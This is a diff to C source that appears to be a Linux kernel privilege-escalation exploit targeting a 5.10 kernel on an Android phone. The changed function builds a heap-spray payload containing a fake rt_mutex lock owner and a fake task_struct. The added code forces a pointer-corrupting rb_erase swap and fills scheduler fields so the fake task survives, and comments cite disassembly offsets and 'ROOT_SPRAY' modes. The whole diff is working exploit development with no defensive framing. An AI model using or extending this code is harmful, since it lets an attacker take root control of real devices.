@@ -1727,10 +1727,20 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         pr_info("mode4 LOCK_EMPTY waiters=0 owner=0 (isolation)\n");
     } else if (payload_mode == PAGE_PAYLOAD_FOPS &&
                (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0) ||
-                env_flag("MODE4_PAD3", 0) || env_flag("MODE4_ROOT_SPRAY", 0))) {
+                env_flag("MODE4_PAD3", 0) || env_flag("MODE4_ROOT_SPRAY", 0)) &&
+               !env_flag("MODE4_OWNER_TASK", 0)) {
       /*
        * owner=1 (NULL|HAS_WAITERS) → clean exit after rb_erase, skip fake_task
        * setprio. bootid write-proof + ROOT_SPRAY proven with this.
+       *
+       * MODE4_OWNER_TASK=1 (roll 11, disasm-driven): our 5.10
+       * rt_mutex_adjust_prio_chain exits at owner<=1 (0x1ee2cc:
+       * ldar owner; cmp #1; b.ls out) — the second rb_erase
+       * (prerequeue-top pi delivery, 0x1ee3ac) is UNREACHABLE with
+       * owner=1. Force owner=fake_task|1 (default shape below): the
+       * chain enters fake_task (pi_lock@0x9EC zero=unlocked,
+       * pi_blocked_on=0 → chain ends), and the prerequeue W0.pi
+       * erase delivers the swap.
        */
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
@@ -1924,6 +1934,17 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
+#ifdef FAKE_TASK_UCLAMP_REQ_OFF
+    /* popsicle-proven uclamp fill (owner=fake_task setprio safety):
+     * MIN_ACTIVE bit set, MAX = 1024 | (19 << 11) | active. */
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF,
+          (1u << 16));
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF + 4,
+          1024U | (19U << 11) | (1u << 16));
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF, (1u << 16));
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF + 4,
+          1024U | (19U << 11) | (1u << 16));
+#endif
     /*
      * Proven-safe scheduler flags for fake_task as rt_mutex owner (CPH2521
      * disasm + t0_last survive). Do NOT bulk-zero 0x100–0x500 (kills se/mm).
